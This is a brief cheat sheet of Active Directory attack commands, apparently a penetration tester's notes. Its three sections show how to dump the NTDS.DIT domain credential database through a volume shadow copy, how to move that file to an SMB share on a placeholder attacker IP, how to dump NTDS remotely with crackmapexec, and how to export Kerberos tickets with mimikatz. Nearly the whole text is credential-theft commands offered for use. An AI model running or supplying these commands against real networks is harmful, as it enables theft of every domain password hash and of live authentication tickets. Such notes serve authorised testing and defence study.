# AD Tips

% active diretory

## Manual dumping NTDS.DIT as a user in Admin group/DA group
```
# Check local group membership > Admin group ?
net localgroup

# Check user priv including Domain
net user <USERNAME>

# Shadow copy of C:i, note the Shado copy volume name
vssadmin CREATE SHADOW /For=C:

# Copy NTDS.DIT form the VSS
# example: cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
cmd.exe /c copy \\?\GLOBALROOT\Device\<..> c:\NTDS\NTDS.dit

# Create a SMB share on the attacker's machine

#  Transferring NTDS.dit to Attack Host
cmd.exe /c move C:\NTDS\NTDS.dit \\<ATK IP>\<SHARENAME>
```

## Dumping NTDS.DIT - netexec (uses VSS)
```
crackmapexec smb <IP> -u <USER> -p <PASSWD> --ntds
```

## Harvest kerberos tickets from windows
```
# Harvest kerberos tickets from windows

# From mimikatz
mimikatz # privilege::debug
sekurlsa::tickets /export

dir *.kirbi
```
